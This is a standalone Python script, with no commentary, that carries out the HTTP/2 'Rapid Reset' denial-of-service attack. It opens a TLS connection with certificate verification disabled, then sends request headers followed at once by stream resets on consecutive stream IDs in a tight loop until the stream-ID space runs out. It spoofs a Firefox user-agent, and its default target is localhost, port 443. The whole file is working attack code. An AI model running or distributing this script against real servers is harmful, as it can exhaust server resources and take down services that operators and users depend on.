import socket
import ssl
import h2.connection
import h2.events

def rapid_reset_attack(target_host, target_port):
    
    context = ssl.create_default_context()
    context.set_alpn_protocols(['h2'])
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    with socket.create_connection((target_host, target_port)) as sock:
        with context.wrap_socket(sock, server_hostname=target_host) as ssock:
            # Initialize H2 Connection
            conn = h2.connection.H2Connection()
            conn.initiate_connection()
            ssock.sendall(conn.data_to_send())
            ssock.setblocking(False) 

            
            stream_id = 1
            request_count = 0
            while True:
                try: 
                    # Send HEADERS
                    conn.send_headers(stream_id, [
                        (':method', 'GET'),
                        (':authority', target_host),
                        (':path', '/'),
                        (':scheme', 'https'),
                        ('user-agent', 'Mozilla/5.0 (X11; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0'),
                    ])

                    # Send RST_STREAM
                    conn.reset_stream(stream_id, error_code=0x0)

                    
                    ssock.sendall(conn.data_to_send())

                    # Increment Stream ID (Must be odd for client-initiated)
                    stream_id += 2 
                    request_count += 1
                except Exception:
                    break

                if stream_id > 2**31 - 1: # Max stream ID limit
                    break

# Usage: rapid_reset_attack('127.0.0.1', 443)
if __name__ == "__main__":
    rapid_reset_attack("127.0.0.1", 443)
